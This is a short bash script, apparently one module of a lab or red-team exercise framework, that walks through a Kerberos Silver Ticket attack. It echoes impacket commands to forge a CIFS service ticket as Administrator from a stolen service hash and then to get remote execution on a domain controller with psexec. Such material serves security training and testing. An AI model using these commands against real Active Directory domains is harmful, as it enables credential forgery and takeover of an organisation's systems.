#!/bin/bash
# CADRE — WT#011 Silver Ticket
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#011 — Silver Ticket"
start_attack "011" "Silver Ticket"

require_tool impacket-ticketer
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Check for prerequisites from WT#009"
run_cmd "ls -la dcsync_output.txt 2>/dev/null || echo 'WARNING: Run WT#009 first to obtain service hash and domain SID'"

step "Step 2: Forge silver ticket for CIFS service"
run_cmd "echo 'Usage: impacket-ticketer -nthash <service_hash> -domain-sid <sid> -domain $DOMAIN_ROOT -spn cifs/$DC01 Administrator'"

step "Step 3: Inject and test access"
run_cmd "echo 'Then: export KRB5CCNAME=/tmp/kirbi && impacket-psexec $DOMAIN_ROOT/Administrator@$DC01 -k -no-pass'"

result $? "Silver Ticket instructions displayed"
